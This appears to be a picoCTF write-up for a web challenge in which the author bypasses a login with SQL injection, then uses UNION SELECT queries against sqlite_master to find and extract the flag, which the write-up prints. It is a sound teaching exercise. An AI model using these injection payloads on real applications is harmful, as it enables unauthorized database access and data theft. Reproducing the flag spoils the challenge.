# Description

Can you find the flag on this website.

Try to find the flag here.

# Solution

Just starting out I put "admin" for user, and "admin" for password.

![image](https://user-images.githubusercontent.com/91398631/232144615-e91e0978-637d-4514-b6a3-7c3856fc7ed8.png)

This is the SQL Query:

```SELECT id FROM users WHERE password = 'admin' AND username = 'admin'```

It shows the password first so that is where you want to put the SQL Injection. Also you can notice it is single qoutes and not double qoutes so that will also be use in createing a SQL Injection Query.

Also note there are common comment charaters for SQL injection, two of the most common ones are "#" and "--".

Injection payload: ``` ' OR 1=1 -- ```

```SELECT id FROM users WHERE password = '  ' OR 1=1 -- ' AND username = 'does not matter'```

You can see the first single qoute closes the password string and the OR 1=1 is always true. Additionall the comment "--" makes the rest of the code irrelevant. 

![image](https://user-images.githubusercontent.com/91398631/232145799-b537858c-afd1-4104-b629-a355406026a4.png)

Now you see a database with another place input which probably means more SQL Injection needed.

This query showed that there are three different columns that need to be worked with.

```' UNION SELECT null,null,null;--```

Before Query:

![image](https://user-images.githubusercontent.com/91398631/232148441-0672fc3b-95ed-4d37-939c-f17924cfa78c.png)

After Query:

![image](https://user-images.githubusercontent.com/91398631/232148497-32b4d5a5-365e-4e90-b483-e75fb5f80de2.png)

This query assumes the use of SQLite as sqlite_master is an internal table in all SQLite databases.

```' UNION SELECT sql,null,null FROM sqlite_master;--```

![image](https://user-images.githubusercontent.com/91398631/232148849-eb3aa138-fa52-415d-959d-5c521200b8f6.png)

From this output it can be seen that the flag is in more_table so I changed one of the attributes to be flag and got it from more_table which resulted in the flag.

```' UNION SELECT null,null,flag FROM more_table;--```

You can put it in any orientation you want, for instance this query also works:

```' UNION SELECT flag,null,null FROM more_table;--```

![image](https://user-images.githubusercontent.com/91398631/232149226-f5d4cc39-6473-4354-8312-feb58a54f56b.png)

Flag: ```picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0...}```
